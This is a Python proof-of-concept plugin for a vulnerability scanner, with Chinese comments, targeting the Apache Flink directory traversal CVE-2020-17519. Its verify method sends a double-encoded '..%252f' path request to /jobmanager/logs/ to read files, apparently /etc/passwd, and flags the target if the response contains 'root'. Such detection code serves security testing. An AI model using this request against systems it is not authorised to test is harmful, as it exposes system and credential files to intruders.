...
import requests
POC_NAME = "ApacheFlinkReadFile"  # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class ApacheFlinkReadFile(BasePoc):
    # PoC实现类，需继承BasePoc
    # 为PoC填充poc_info、scan_info、test_case三个字典中的基本信息

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0029',  # PoC的VID编号
            'vbid': '',
            'Name': 'Apache Flink Read File',  # PoC名称
            'Author': 'feier',  # PoC作者
            'Create_date': '2021-7-24',  # PoC创建时间
        },

        'vul': {
            'Product': 'ApacheFlink',  # 漏洞所在产品名称
            'Version': '0.1',  # 产品的版本号
            'Type': 'ReadFile',  # 漏洞类型
            'Severity': 'medium',  # 漏洞危害等级low/medium/high/critical
            'isWeb': True,  # 是否Web漏洞
            'Description': '''
                Apache Flink 目录穿越漏洞,远程攻击者通过REST API目录遍历，可造成文件读取/写入的影响
            ''',  # 漏洞简要描述
    ...
    def verify(self, first=False):
        ...
        # 以下是PoC的检测逻辑
        url =target + "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..{}".format(
            file_name)
        ...
        location = ""
        try:
            response = requests.get(url=url, timeout=10, verify=False, headers=headers)
            ...
            if "root" in response.text:
                ...
                if verbose:
                    highlight('[*] Apache Flink file read CVE-2020-17519 Found')
                    # print("\033[32m[o] 目标 {} 存在漏洞,成功读取 /etc/passwd ，响应为:\n{}\033[0m".format(url, response.text))
            else:
                if verbose:
                    highlight('[*] Apache Flink file read CVE-2020-17519 Not Found')
